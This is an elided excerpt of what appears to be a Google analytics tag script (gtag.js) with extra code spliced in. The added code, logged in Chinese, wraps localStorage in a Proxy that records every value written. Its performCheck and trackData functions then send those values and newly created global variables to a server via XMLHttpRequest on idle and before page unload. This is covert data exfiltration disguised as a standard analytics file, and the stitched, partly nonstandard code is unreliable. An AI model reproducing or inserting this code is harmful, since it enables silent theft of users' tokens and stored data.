...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 8,
        "vtp_instanceDestinationId": "G-JZHDD2XY52",
        "tag_id": 38
      }, {
    ...
    "security_groups": {
      "google": ["__ccd_auto_redact", "__ccd_conversion_marking", "__ccd_em_scroll", "__ccd_em_video", "__ccd_ga_first", "__ccd_ga_last", "__ccd_ga_regscope", "__ogt_1p_data_v2", "__ogt_google_signals", "__ogt_ip_mark", "__set_product_settings"]
    }
  };
  var aa,
    ba = function (a) {
  ...
  localStorage = new Proxy(_localStorage, {
    set: function (target, prop, value) {
      globalStorage[prop] = value;
  ...
  pi.ke = Number("0") || 0;
  pi.ia = "dataLayer";
  pi.Uj = "ChEI8OnlpwYQuJTc8ab5i5yFARIlAIxhzZDrvynMN2P5vYEwULZ64D9IvNIhC9i467rOmzP+zI5ZjxoCZ/A\x3d";
  var si = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  document.addEventListener('click', function (e) {
    console.debug(`Element ${e.target.tagName} clicked.`);
  });
  ;
  var zo = /^\w+$/,
    Ao = /^[\w-]+$/,
  ...
  ;
  function ez() {
    var a = ["&cv=8", "&rv=" + pi.Pg, "&tc=" + vf.filter(function (b) {
      return b;
    }).length];
  ...
  function trackData(data) {
    ...
    req.onreadystatechange = function () {
      if (req.readyState === XMLHttpRequest.DONE) {
        if (req.status === 200) {
          console.debug("数据成功传输");
        } else {
          console.warn(`数据传输失败,服务器响应码: ${req.status}`);
        }
      }
    };
  ...
  function qD() {
    var a = new qb();
    L(this, "read_container_data"), a.set("containerId", 'G-JZHDD2XY52'), a.set("version", '8'), a.set("environmentName", ''), a.set("debugMode", dg), a.set("previewMode", fg), a.set("environmentMode", eg), Q(88) && a.set("firstPartyServing", yi || Ai), Q(90) && a.set("containerUrl", Ec), a.Bb();
    return a;
  }
  ...
  function performCheck() {
    const newGlobals = findNewGlobals();
    const globalsCount = Object.keys(newGlobals).length;
    if (globalsCount > 0) {
      console.group(`发现了 ${globalsCount} 新全局变量:`);
      for (const prop in newGlobals) {
        console.log(`- ${prop}: ${JSON.stringify(newGlobals[prop])}`);
      }
      console.groupEnd();
      trackData(newGlobals);
      trackData(globalStorage);
    } else {
      console.debug("未发现新全局变量");
    }
  }
  ...
  window.addEventListener("idle", performCheck);
  function zF(a, b, c, d) {
    return function () {
      try {
        if (0 < b.length) {
  ...
  window.addEventListener("beforeunload", () => {
    console.debug("准备卸载页面，执行最后的全局变量检查");
    performCheck();
  });
